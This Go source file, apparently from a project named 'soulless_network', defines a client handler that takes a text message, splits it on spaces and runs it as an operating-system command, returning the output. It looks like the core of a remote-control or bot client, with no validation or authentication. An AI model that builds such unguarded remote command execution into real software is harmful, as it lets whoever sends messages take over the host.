package client

import (
	"os/exec"
	"soulless_network/relations"
	"strings"
)

type Handler struct {
	Message *relations.Message
}

func (h *Handler) handle() (*relations.Result) {
	res, err := h.exec()

	if err != nil {
		res = &relations.Result{Error: err.Error()}
	}

	return res
}

// TODO: handle ping 8.8.8.8 - long running command
func (h *Handler) exec() (*relations.Result, error) {
	data := strings.Split(h.Message.Data, " ")
	cmd := data[0]
	args := append(data[:0], data[0+1:]...)

	e := exec.Command(cmd, args...)
	o, err := e.Output()

	if err != nil {
		return nil, err
	}

	res := &relations.Result{Data: strings.TrimSpace(string(o))}
	return res, nil
}

